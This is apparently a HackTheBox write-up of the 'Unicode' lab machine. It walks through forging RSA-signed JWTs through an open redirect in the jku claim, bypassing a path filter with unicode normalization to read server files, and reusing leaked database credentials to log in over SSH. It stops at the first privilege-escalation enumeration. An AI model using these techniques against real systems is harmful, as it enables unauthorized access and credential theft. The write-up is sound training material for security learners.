---
title: HTB: Unicode
url: https://0xdf.gitlab.io/2022/05/07/htb-unicode.html
date: 2022-05-07T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-unicode, hackthebox, nmap, flask, python, jwt-io, feroxbuster, jwt-rsa, open-redirect, filter, waf, unicode, unicode-normalization, directory-traversal, credentials, share, pyinstaller, pyinstxtractor, uncompyle6, parameter-injection, htb-backdoor
---

![Unicode](https://0xdfimages.gitlab.io/img/unicode-cover.png)

Unicode’s name reflects the need to bypass web filtering of input by abusing unicode characters, and how they are normalized to abuse a directory traversal bug. There’s also some neat JWT abuse, targeting the RSA signed versions and using an open redirect to trick the server into trusting a public key I host. To escalate, there’s some parameter injection in a PyInstaller-built ELF file.

## Box Info

| Name | [Unicode](https://hackthebox.com/machines/unicode)  [Unicode](https://hackthebox.com/machines/unicode) [Play on HackTheBox](https://hackthebox.com/machines/unicode) |
| --- | --- |
| Release Date | [27 Nov 2021](https://twitter.com/hackthebox_eu/status/1463912410436325377) |
| Retire Date | 07 May 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Unicode |
| Radar Graph | Radar chart for Unicode |
| First Blood User | 00:47:14[Ziemni Ziemni](https://app.hackthebox.com/users/12507) |
| First Blood Root | 01:35:43[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [webspl01t3r webspl01t3r](https://app.hackthebox.com/users/137089) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.126
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-05 17:49 UTC
Nmap scan report for 10.10.11.126
Host is up (0.098s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.37 seconds
oxdf@hacky$ nmap -p 22,80, -sCV -oA scans/nmap-tcpscripts 10.10.11.126
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-05 17:50 UTC
Nmap scan report for 10.10.11.126
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Hugo 0.83.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hackmedia
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

### Website - TCP 80

#### Site

The site is for a threat intelligence company:

![image-20220505135749561](https://0xdfimages.gitlab.io/img/image-20220505135749561.png)

The “Login” and “Register” links lead to forms to do just that.

The middle link leads to `/redirect/?url=google.com`, which then returns a 302 to `http://google.com`.

I’ll create an account and login, it redirects to `/dashboard`:

[![image-20220505141258412](https://0xdfimages.gitlab.io/img/image-20220505141258412.png)](https://0xdfimages.gitlab.io/img/image-20220505141258412.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220505141258412.png)

I’ll note at the very bottom it says “Powered By Flask” (presumably the [Python framework](https://flask.palletsprojects.com/en/2.1.x/)):

![image-20220505141459059](https://0xdfimages.gitlab.io/img/image-20220505141459059.png)

“Buy Now” leads to `/pricing/` which has some other pages that don’t seem to have much interaction.

“Upload a Threat Report” presents a simple upload form:

![image-20220505141421961](https://0xdfimages.gitlab.io/img/image-20220505141421961.png)

When I browse for a file on my system, it sets the filter to PDF files. If I try to upload anything else, it returns:

![image-20220505141627782](https://0xdfimages.gitlab.io/img/image-20220505141627782.png)

On submitting a PDF, it just shows a thank you message:

![image-20220505141740952](https://0xdfimages.gitlab.io/img/image-20220505141740952.png)

#### Tech Stack

I couldn’t find an extension that loaded any of the pages. The login and register pages are `/login/` and `/register/` respectively.

The HTTP headers don’t help much either:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 05 May 2022 17:53:16 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 2078

```

My only clue at this point is that the page says it’s powered by Flask, so that seems like the best guess.

When I log in, it sets a long cookie called `auth`:

```

HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 05 May 2022 18:11:41 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 228
Connection: close
Location: http://10.10.11.126/dashboard/
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiMHhkZiJ9.qh4KfXw0uaz2sk6tAFK2gl2doZ2yNcn8iAUnjUNl_1haXNTVG8twfa2UGW11itS2ryFG_tD_Xh1Qy3u0ZhdJqJbkvLinmL4FRfC_pTzmeO8itoGDVmdRQtnZ5bb7ivOQ5QGhvc2GASwVfHtf7D1ocaFdRMNJCfLwUQSIZjFbbBnasdrguY-x7Czhua4Vjgk87wyY8t2OrbIBr1cT5fABzpaV1CijCiT6XpO_tD4xBD8foMhVgF6A5Zdycl4VEzeC0Ygxgw8rjj8j8R7vBQ7iDGsRJPJF6_xva6u3OLjCUqzm2T0XLK_UmpN7EFVQhSC0zk1UKXBj0wzeK8oJve41aQ; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/dashboard/">/dashboard/</a>. If not click the link.

```

That looks like either a JWT or a Flask cookie. Plugging it into [jwt.io](https://jwt.io) proves it’s a JWT:

[![image-20220505142049874](https://0xdfimages.gitlab.io/img/image-20220505142049874.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220505142049874.png)

I’ll note the URL in the `jku` element. I’ll add `hackmedia.htb` to my `/etc/hosts` file, but the entire site seem the same when visited that way. I’ll do some fuzzing for subdomains, but not find anything. I’ll come back to the `jku`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.126

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.126
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET      515l      959w     9294c Got 200 for http://10.10.11.126/1dc43cde494d44398a6fcf30242706aa (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 9294 responses; toggle this behavior by using --dont-filter
WLD      GET      515l      959w     9294c Got 200 for http://10.10.11.126/d7ab2575188744d58f034faee736581fe97b269bdbb04fe7a928739894e35db448f1b3ce8650468d8a62fcfaf8adf318 (url length: 96)
308      GET        4l       24w      264c http://10.10.11.126/checkout => http://10.10.11.126/checkout/
308      GET        4l       24w      258c http://10.10.11.126/error => http://10.10.11.126/error/
308      GET        4l       24w      262c http://10.10.11.126/pricing => http://10.10.11.126/pricing/
[####################] - 3m    120000/120000  0s      found:5       errors:1      
[####################] - 3m     30002/30000   157/s   http://10.10.11.126 
[####################] - 3m     30000/30000   157/s   http://10.10.11.126/checkout 
[####################] - 3m     30000/30000   157/s   http://10.10.11.126/error 
[####################] - 3m     30000/30000   158/s   http://10.10.11.126/pricing 

```

It’s interesting that there’s a wildcard response, and it missed most of the pages I already know about. Nothing new, regardless.

## Shell as code

### Admin Access To Site

#### JWT Background

Most of the time that I’ve shown JWTs before, they’ve used the `HS256` algorithm. This is a symmetric algorithm, using a keyed SHA256 hash signature, so the key or secret is the same for signing and validating. This makes sense for a case where I’m authenticating to the same site that issued the token.

However, there are times that one site may want to use a token from another site. Maybe there’s an ecosystem of applications, and they don’t want to manage having to keep the secret’s synced across all these applications, but they do want to be able to look at a token granted by one and trust it. That’s where the `RS256` algorithm would come it. It uses a public and private key pair, signing the token with the private key, and then validating that signature with the public key. This means that the public key can be publicly available on the website, and anyone can validate that the token is legit.

Because this app ecosystem might have lots of possible key-pairs that are trusted, each token can use the `jku` claim to show where the private key is. Because this is coming from the user, it’s the validating server’s responsibility to decide if it would trust the given `jku`.

#### jwks.json

The `jku` in the token from Unicode is `http://hackmedia.htb/static/jwks.json`. It’s a simple JSON object, with a list (in this case only one in that list) of some metadata about the algorithm, and the `n` and `e`, two elements that make up the public key in RSA:

![image-20220505144504211](https://0xdfimages.gitlab.io/img/image-20220505144504211.png)

#### Change jku

I’m going to try to get Unicode to validate a JWT using a public key on my webserver. If that works, then I’ll generate an RSA key pair and try to trick Unicode into trusting a token I forge.

Typically I drop into Python and use [PyJWT](https://pyjwt.readthedocs.io/en/stable/) to manipulate JWTs, but in this case, I just want to change the `jku`, and I’m not worried about the signature (yet), so I’ll just use `base64` with `bash` (as a JWT is just three base64 encoded string combined with `.`):

```

oxdf@hacky$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ==" | base64 -d
{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/jwks.json"}

```

I did add some padding to the end (JWTs strip that) to get it to not complain about invalid input.

I’ll change the `jku`:

```

oxdf@hacky$ echo '{"typ":"JWT","alg":"RS256","jku":"http://10.10.14.6/jwks.json"}' | base64 -w0
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4xMC4xNC42L2p3a3MuanNvbiJ9Cg==

```

I’ll replace the first section of my JWT in Firefox, and refresh `/dashboard`:

![image-20220505150158838](https://0xdfimages.gitlab.io/img/image-20220505150158838.png)

There’s no hit on my webserver. Because it didn’t even try to get the public key, it can’t be an issue with the signing being invalid (it needs to public key to know that). This must mean that the server isn’t trusting my host as a place to serve the public key.

#### Open Redirect

I noted at the start the link to `/redirect/?url=google.com`. This is useful because it’s a URL on `hackmedia.htb`, which means that perhaps the site will trust it returns a public key. I’ll update the `jku` to be `http://hackmedia.htb/redirect/?url=10.10.14.6/jwks.json`:

```

oxdf@hacky$ echo -n '{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/redirect/?url=10.10.14.6/jwks.json"}' | base64 -w0
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTQuNi9qd2tzLmpzb24ifQ==

```

Putting that into Firefox returns 404, but with the URL of `http://10.10.14.6/jwks.json`. This still doesn’t work (no contact at my webserver).

What if the site is looking for something to start with `hackmedia.htb/static`? I’ll try that:

```

oxdf@hacky$ echo -n '{"typ":"JWT","alg":"RS256","jku":"http://hackmedia.htb/static/../redirect
/?url=10.10.14.6/jwks.json"}' | base64 -w0
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8/dXJsPTEwLjEwLjE0LjYvandrcy5qc29uIn0=

```

Updating the cookie and refreshing `/dashboard`, there’s a hit on my webserver:

```

oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.126 - - [05/May/2022 19:39:45] code 404, message File not found
10.10.11.126 - - [05/May/2022 19:39:45] "GET /jwks.json HTTP/1.1" 404 -

```

And then the browser shows the login form (interestingly, it is still at `/dashboard`). This is a great indicator that it will trust the public key I serve here.

#### Generate Key Pairs

[This link](https://techdocs.akamai.com/iot-token-access-control/docs/generate-rsa-keys) from Akamai shows the commands to generate an RSA key pair:

```

oxdf@hacky$ openssl genrsa -out jwtRSA256-private.pem
Generating RSA private key, 2048 bit long modulus (2 primes)
...............................+++++
.......................+++++
e is 65537 (0x010001)
oxdf@hacky$ openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem
writing RSA key

```

The first command I removed the number when `openssl` said there were extra arguments.

Now the [next page](https://techdocs.akamai.com/iot-token-access-control/docs/generate-jwt-rsa-keys) shows how to generate a JWT using `openssl`, but I’ll just jump back to [jwt.io](https://jwt.io):

[![image-20220505154908886](https://0xdfimages.gitlab.io/img/image-20220505154908886.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220505154908886.png)

The public and private keys are loaded into the signature bit, and the data looks good. I’ll load that into Firefox and verify it still hits my server:

```
10.10.11.126 - - [05/May/2022 19:49:59] code 404, message File not found
10.10.11.126 - - [05/May/2022 19:49:59] "GET /jwks.json HTTP/1.1" 404 -

```

#### jwks.json

To full use this key, I need to create a `jwks.json` file that matches this new key.

I’ll download the existing public key file into a directory I’m hosting with `python3 -m http.server 80`:

```

oxdf@hacky$ wget http://hackmedia.htb/static/jwks.json
--2022-05-05 18:47:07--  http://hackmedia.htb/static/jwks.json
Resolving hackmedia.htb (hackmedia.htb)... 10.10.11.126
Connecting to hackmedia.htb (hackmedia.htb)|10.10.11.126|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 544 [application/json]
Saving to: ‘jwks.json’

jwks.json                        100%[=======================================================>]     544  --.-KB/s    in 0s      

2022-05-05 18:47:07 (74.4 MB/s) - ‘jwks.json’ saved [544/544]

```

The only thing I need to change are the `n` and `e` values.

`openssl` will give these:

```

oxdf@hacky$ openssl rsa -in jwtRSA256-public.pem -pubin -text -noout
RSA Public-Key: (2048 bit)
Modulus:
    00:b7:45:d7:10:28:f0:17:62:ad:b0:1c:f3:00:32:
    95:46:df:a3:33:64:a2:a4:89:82:52:5d:13:e2:ff:
    e8:5a:d2:ec:92:32:ed:d1:12:80:c9:00:77:6b:f5:
    59:6a:81:99:89:6f:64:20:20:5c:f1:9d:e7:80:dd:
    a6:05:fd:27:17:4b:13:70:8c:6d:20:a8:95:c4:4c:
    0f:e2:46:48:a7:7b:04:af:f1:f6:74:39:9a:83:d0:
    74:54:44:e1:29:48:fb:2b:9b:90:9c:4a:7c:01:fd:
    75:34:5a:60:3d:a7:c5:38:3b:15:b7:d5:21:1d:ac:
    a1:18:0e:76:02:f9:ae:d5:11:46:fd:60:e4:89:4b:
    69:1d:d2:56:6f:54:c8:0d:a9:59:08:50:36:d6:f3:
    81:fb:c7:e7:a4:b2:ab:3c:88:76:74:42:f4:f0:04:
    d6:a1:3a:44:e1:96:eb:25:30:d4:fc:62:7c:9e:f3:
    dd:d9:c5:e1:01:3c:e4:20:c1:f7:cb:53:1d:40:de:
    4b:0a:f0:d9:93:ee:3e:fa:ef:ac:ea:6e:71:bd:ed:
    f8:99:06:c3:c0:cc:5f:2e:28:3f:5a:b4:6f:a1:d1:
    16:45:92:f8:21:49:09:92:b1:12:3d:8a:ee:a3:4c:
    ea:b8:6e:2f:3b:ff:13:64:68:45:9c:69:c9:11:31:
    68:77
Exponent: 65537 (0x10001)

```

The modulus is `n`, and the Exponent is `e`. I still need to get them into the format used in `jwks.json`. If I look at`e`, it’s `AQAB`. That looks like base64, and is:

```

oxdf@hacky$ echo "AQAB" | base64 -d | xxd -p
010001

```

So rather than showing it as a number, it’s raw bytes base64-encoded. The exponent for both the original and my private key is 0x10001 (which is very common). So I just need `n`.

I’ll use `grep` to get just the lines with the modulus:

```

oxdf@hacky$ openssl rsa -in jwtRSA256-public.pem -pubin -text -noout | grep "^   "
    00:b7:45:d7:10:28:f0:17:62:ad:b0:1c:f3:00:32:
    95:46:df:a3:33:64:a2:a4:89:82:52:5d:13:e2:ff:
    e8:5a:d2:ec:92:32:ed:d1:12:80:c9:00:77:6b:f5:
    59:6a:81:99:89:6f:64:20:20:5c:f1:9d:e7:80:dd:                                         a6:05:fd:27:17:4b:13:70:8c:6d:20:a8:95:c4:4c:
    0f:e2:46:48:a7:7b:04:af:f1:f6:74:39:9a:83:d0:                                         74:54:44:e1:29:48:fb:2b:9b:90:9c:4a:7c:01:fd:                                         75:34:5a:60:3d:a7:c5:38:3b:15:b7:d5:21:1d:ac:                                         a1:18:0e:76:02:f9:ae:d5:11:46:fd:60:e4:89:4b:                                         69:1d:d2:56:6f:54:c8:0d:a9:59:08:50:36:d6:f3:
    81:fb:c7:e7:a4:b2:ab:3c:88:76:74:42:f4:f0:04:
    d6:a1:3a:44:e1:96:eb:25:30:d4:fc:62:7c:9e:f3:
    dd:d9:c5:e1:01:3c:e4:20:c1:f7:cb:53:1d:40:de:
    4b:0a:f0:d9:93:ee:3e:fa:ef:ac:ea:6e:71:bd:ed:
    f8:99:06:c3:c0:cc:5f:2e:28:3f:5a:b4:6f:a1:d1:
    16:45:92:f8:21:49:09:92:b1:12:3d:8a:ee:a3:4c:
    ea:b8:6e:2f:3b:ff:13:64:68:45:9c:69:c9:11:31:
    68:77

```

`tr -d` to delete colons, spaces, and newlines:

```

df@hacky[~/hackthebox/unicode-10.10.11.126]$ openssl rsa -in jwtRSA256-public.pem -pubin -text -noout |
> grep "^   " |
> tr -d ': \n'
00b745d71028f01762adb01cf300329546dfa33364a2a48982525d13e2ffe85ad2ec9232edd11280c900776bf5596a8199896f6420205cf19de780dda605fd27174b13708c6d20a895c44c0fe24648a77b04aff1f674399a83d0745444e12948fb2b9b909c4a7c01fd75345a603da7c5383b15b7d5211daca1180e7602f9aed51146fd60e4894b691dd2566f54c80da959085036d6f381fbc7e7a4b2ab3c88767442f4f004d6a13a44e196eb2530d4fc627c9ef3ddd9c5e1013ce420c1f7cb531d40de4b0af0d993ee3efaefacea6e71bdedf89906c3c0cc5f2e283f5ab46fa1d1164592f821490992b1123d8aeea34ceab86e2f3bff136468459c69c911316877

```

That’s the modulus in hex. I’ll convert that to raw bytes using `xxd`, and then base64 encode it:

```

oxdf@hacky$ openssl rsa -in jwtRSA256-public.pem -pubin -text -noout | 
> grep "^   " | 
> tr -d ': \n' |
> xxd -r -p |
> base64 -w0
ALdF1xAo8BdirbAc8wAylUbfozNkoqSJglJdE+L/6FrS7JIy7dESgMkAd2v1WWqBmYlvZCAgXPGd54DdpgX9JxdLE3CMbSColcRMD+JGSKd7BK/x9nQ5moPQdFRE4SlI+yubkJxKfAH9dTRaYD2nxTg7FbfVIR2soRgOdgL5rtURRv1g5IlLaR3SVm9UyA2pWQhQNtbzgfvH56SyqzyIdnRC9PAE1qE6ROGW6yUw1PxifJ7z3dnF4QE85CDB98tTHUDeSwrw2ZPuPvrvrOpucb3t+JkGw8DMXy4oP1q0b6HRFkWS+CFJCZKxEj2K7qNM6rhuLzv/E2RoRZxpyRExaHc=

```

I’ll update that value in `jwks.json`.

On refreshing in Firefox, I’m back at `/dashboard`, logged in as 0xdf. So I haven’t actually made progress to another user, but I’ve shown that I can sign a token saying I’m 0xdf, and have the site trust me.

#### admin Token

I wanted to start with a user I know exists to make sure that if I had issues, it couldn’t be because I forged a token for a user that doesn’t exist. Now that I’ve proven I can do it, I’ll try other users.

If I try to register as admin, it returns a helpful error message (even with typos):

![image-20220505162909535](https://0xdfimages.gitlab.io/img/image-20220505162909535.png)

I’ll change my token username to admin in [jwt.io](https://jwt.io), update the cookie in Firefox, and refresh `/dashboard`. There’s a hit at my webserver for the `jwks.json` file, and then a brand new page I haven’t seen before:

[![image-20220505163110007](https://0xdfimages.gitlab.io/img/image-20220505163110007.png)](https://0xdfimages.gitlab.io/img/image-20220505163110007.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220505163110007.png)

### Local File Read

#### Admin Dashboard

The dashboard is mostly just dummy data. The “Current month” link under “Saved reports” points to `/display/?page=monthly.pdf`, and “Last quarter” points `/display/?page=quarterly.pdf`.

Clicking on either returns:

![image-20220505164338481](https://0xdfimages.gitlab.io/img/image-20220505164338481.png)

#### Directory Traversal Attempt

The structure of that URL suggests it is trying to load a file from the file system. I want to see if I can read outside the current directory. Visiting `/display/?page=/etc/passwd` returns a 302 redirect to `/filenotfound/`:

![image-20220505164535686](https://0xdfimages.gitlab.io/img/image-20220505164535686.png)

“we do a lot input filtering you can never bypass our filters.Have a good day” is the message. That’s different from a typically message for a missing page. For example, if I visit `/0xdf`:

![image-20220505164618572](https://0xdfimages.gitlab.io/img/image-20220505164618572.png)

It doesn’t redirect, and just displays this similar but different page. I’ll play around with some other inputs to get a feel for what’s filtered, and when I try `/display/?page=/var/log/apache2/error.log`, I get yet another error message:

![image-20220505172610968](https://0xdfimages.gitlab.io/img/image-20220505172610968.png)

So that one perhaps isn’t filtered, but just doesn’t find the file? If that’s the case, it’s likely that I need a relative path, because the webserver is prepending some path before my input.

#### Identify Block List

I’ll play with different inputs `..` returns the “.. Not Found” message (likely not blocked). “../” gives the message about filtering. “./” is not blocked. So it seems to be the full string “../” that is on the block list. More tests:

| Input | Result |
| --- | --- |
| `..` | Not blocked |
| `./` | Not blocked |
| `../` | Blocked |
| `/et` | Not blocked |
| `/etc` | Blocked |
| `et` | Not blocked |
| `etc` | Blocked |
| `..etc` | Not blocked |
| `var` | Not blocked |
| `/var` | Blocked |

It seems to key on some key directories at the start, as well as `../`. I don’t care so much about the key directories, as my hypothesis is that that won’t work anyway.

#### Unicode

Given the box name, and the need to bypass a filter, I’m going to look for unicode normalization bugs. [This post](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html) does a really nice job explaining how they work.

The challenge is that there are a lot of unicode characters that to the eye look exactly the same as ASCII characters, but are technically different. If you want your site to handle these characters as the user expects (likely that they do the same thing as their ASCII counterparts), then you can use a normalization function to convert them back to the equivalent ASCII.

If the normalization happens after the WAF / blocking function, then this can be a way to bypass the block. Typically WAFs are run on separate systems from the application itself, and therefore before the normalization.

One example in the post above is (U+2025), which is this character: `‥`. It looks like two dots, but it’s one unicode character. When it’s normalized, it becomes two ASCII periods.

If I visit `/display/?page=‥/‥/‥/etc/passwd`, it returns the not found message (so not blocked):

![image-20220505173751965](https://0xdfimages.gitlab.io/img/image-20220505173751965.png)

With one more set of `‥/`:

![image-20220505173822728](https://0xdfimages.gitlab.io/img/image-20220505173822728.png)

#### Script

To make enumeration easier, I’ll move to `curl`. Copying the URL and pasting it shows the encoded unicode characters:

```

oxdf@hacky$ curl 'http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd' --cookie "auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjYvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.aTCL_Z8Qqbtdb-V9AbPIwczs1_IGSWzTrgqDrh0s9XPOSYF2YBbTOaOoYG0GC4ZtoXFmxm3o1MNevmG-4HHxYlTISZGaGIMISkxSFW6G-7aO4cUf8N1B6vQsMzoZbmFXJ1CXUFWANLqTj0POtVaebD9u_5Pet9cgvLfr0q8SqoSmfYGRLk6k4P9y7PPjDOflrFq1lcsygWXtBtEhgrSnzrnaxYq5iMGIpWMO4JAlrwlW58HuHi-5kiUUxt7rb_iHSCcVPKYZ9DBe0AByEynarJNLbv70jca5WZlGSER6t5kDebtoD5qgpJJxihjR7F4Nh_-glqPX8lMlkshRJh13Tg"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
code:x:1000:1000:,,,:/home/code:/bin/bash

```

`%E2%80%A5` must be `‥`.

I’ll create a short `bash` script:

```

#!/bin/bash

cookie="auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjYvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.aTCL_Z8Qqbtdb-V9AbPIwczs1_IGSWzTrgqDrh0s9XPOSYF2YBbTOaOoYG0GC4ZtoXFmxm3o1MNevmG-4HHxYlTISZGaGIMISkxSFW6G-7aO4cUf8N1B6vQsMzoZbmFXJ1CXUFWANLqTj0POtVaebD9u_5Pet9cgvLfr0q8SqoSmfYGRLk6k4P9y7PPjDOflrFq1lcsygWXtBtEhgrSnzrnaxYq5iMGIpWMO4JAlrwlW58HuHi-5kiUUxt7rb_iHSCcVPKYZ9DBe0AByEynarJNLbv70jca5WZlGSER6t5kDebtoD5qgpJJxihjR7F4Nh_-glqPX8lMlkshRJh13Tg"
file=$1

curl "http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/$file" --cookie "$cookie" -s -o-

```

`-s` will hide the progress bars, and `-o-` will output to STDOUT even for binary output.

It works:

```

oxdf@hacky$ ./read_file.sh /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"

```

### Enumerate Application Source

#### Locate Source - /proc

Since I’m executing through the webapp, I’ll look at `/proc/self` to get an understand of where it’s running from. I went into detail about `/proc` recently in the [Backdoor](/2022/04/23/htb-backdoor.html#strategy) post.

I’ll start by reading `cmdline`, replacing null bytes with spaces:

```

oxdf@hacky$ ./read_file.sh /proc/self/cmdline | tr '\000' ' '
/usr/local/bin/uwsgi --socket localhost:8000 --protocol=http -w wsgi:app --workers 100 

```

So `uwsgi` is the webserver here, hosting the Flask Python app. `-w wsgi:app` is loading from `wsgi.py` an object named `app`.

I don’t have a path to where that is located. I can look at `environ` for hints (replacing nulls with newlines):

```

oxdf@hacky$ ./read_file.sh /proc/self/environ | tr '\000' '\n'; echo
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/home/code
LOGNAME=code
USER=code
SHELL=/bin/bash
INVOCATION_ID=c168a3de6e1249b49bec588ff0426a9c
JOURNAL_STREAM=9:34023

```

It might be in `/home/code`, but no luck:

```

oxdf@hacky$ ./read_file.sh /home/code/wsgi.py
<html>                          
    <head>                    
        <style>                                                 
            html,
body {
  height: 100%;
  width: 100%;                                                  
  margin: 0px;
  background: linear-gradient(90deg, rgba(47,54,64,1) 23%, rgba(24,27,32,1) 100%);
}  
...[snip]...
    <h3>../../../..//home/code/wsgi.py Not found</h3>           
...[snip]...

```

The returned stuff is HTML, but it’s the 404 page saying the file isn’t found.

I’ll try `/proc/self/cwd/wsgi.py`. `cwd` is a symbolic link to the current working directory. It works:

```

from app import app
from werkzeug.debug import DebuggedApplication
if __name__ == "__main__":
    app.run()

```

`wsgi.py` is a simple script that’s importing an `app` object from from `app` (which means `app.py`). I’ll pull `app.py`:

```

oxdf@hacky$ ./read_file.sh /proc/self/cwd/app.py
import base64                                                   
from MySQLdb import cursors                                     
from flask import Flask, abort, request,render_template,make_response,redirect                                                   
from werkzeug.utils import secure_filename                      
import unicodedata
...[snip]...

```

This is the main application.

#### Locate Source - Relative

An alternative way to find the source is to work relative to the working directory. I suspect the application is Python, and `app.py` and `main.py` are common filenames. I’ll try `page=app.py`, and it returns not found. That makes sense, as , typically static files like PDFs are not loaded from the application root, but rather like a `files` folder, or maybe a `static/files` folder. I’ll try one folder up, and `page=%E2%80%A5/app.py` returns the page.

#### Credentials

I’ll start to look for potentially exploitable paths, but right a the top something jumps out:

```

db=yaml.load(open('db.yaml'))                                   
app.config['MYSQL_HOST']= db['mysql_host']                      
app.config['MYSQL_USER']=db['mysql_user']
app.config['MYSQL_PASSWORD']=db['mysql_password']
app.config['MYSQL_DB']=db['mysql_db']
app.debug=True

```

This is reading the DB connection information from `db.yaml`. I’ll grab that file:

```

oxdf@hacky$ ./read_file.sh /proc/self/cwd/db.yaml
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"

```

### SSH

The DB creds are for a user, code, and that same user is in `/etc/passwd`. I’ll try those creds over SSH, and they work:

```

oxdf@hacky$ sshpass -p 'B3stC0d3r2021@@!' ssh code@hackmedia.htb
...[snip]...
code@code:~$

```

code can read `user.txt`:

```

code@code:~$ cat user.txt
d907ddec************************

```

## Shell as root

### Enumeration

`sudo -l` shows a file that code can run as root:

```

code@code:~$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport

```

Running the program, it presents a menu:

```

code@code:~$ treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:

```

I’ll try 2, and it errors out:

```

Enter your choice:2
Traceback (most recent call last):
  File "treport.py", line 76, in <module>
  File "treport.py", line 17, in list_files
PermissionError: [Errno 13] Permission denied: '/root/reports/'
